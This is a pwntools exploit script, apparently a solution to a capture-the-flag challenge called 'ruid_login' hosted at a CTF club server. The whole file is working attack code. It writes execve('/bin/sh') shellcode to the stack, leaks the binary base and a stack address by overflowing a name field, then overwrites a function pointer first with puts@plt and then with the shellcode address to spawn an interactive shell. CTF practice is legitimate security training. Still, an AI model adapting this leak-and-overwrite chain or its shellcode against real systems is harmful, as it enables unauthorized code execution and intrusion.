#!/usr/bin/env python3

from pwn import *

exe = ELF('ruid_login_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x55555555582b   
        b*0x55555555571f
        c   
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('challs.ctf.rusec.club', 4622)
else:
    p = process([exe.path])
GDB()

# users: 0x555555558100
# gpa & name: 0x555555558020

"""
change gpa: 1804289383
change name: 846930886

"""

def gpa():
    slna(b'Please enter your RUID: ', 1804289383)

def rename(idx, name):
    slna(b'Please enter your RUID: ', 846930886)
    slna(b'Num: ', idx)
    sa(b'name: ', name)


shellcode = asm("""
    mov rax, 29400045130965551
    push 0
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor edx, edx
    mov eax, 0x3b
    syscall
"""
)

# write shellcode in stack

sa(b'your netID: ', shellcode)

load = b'A'*0x20

# leak binary by %s

rename(0, load)

p.recvuntil(load)

binary_leak = u64(p.recvline()[-7:-1].ljust(8, b'\0'))
exe.address = binary_leak - 0x12f3

info("binary leak: " + hex(binary_leak))
info("binary base: " + hex(exe.address))

# overwrite function ptr with put plt 
# - leak stack by rdi #

load = b'A'*0x20 + p64(exe.plt.puts)

rename(0, load)

# call put plt - leak stack

gpa()

p.recvuntil(b'Welcome')
padd = p.recvline()

stack_leak = u64(p.recvline()[-7:-1] + b'\0\0')
info("stack leak: " + hex(stack_leak))

# overwrite func ptr puts with shellcode ptr

load = b'A'*0x20 + p64(stack_leak + 0x1c0)

rename(0, load)

# execute shellcode

gpa()

#0x7fffffffde00   0x7fffffffde20

p.interactive()
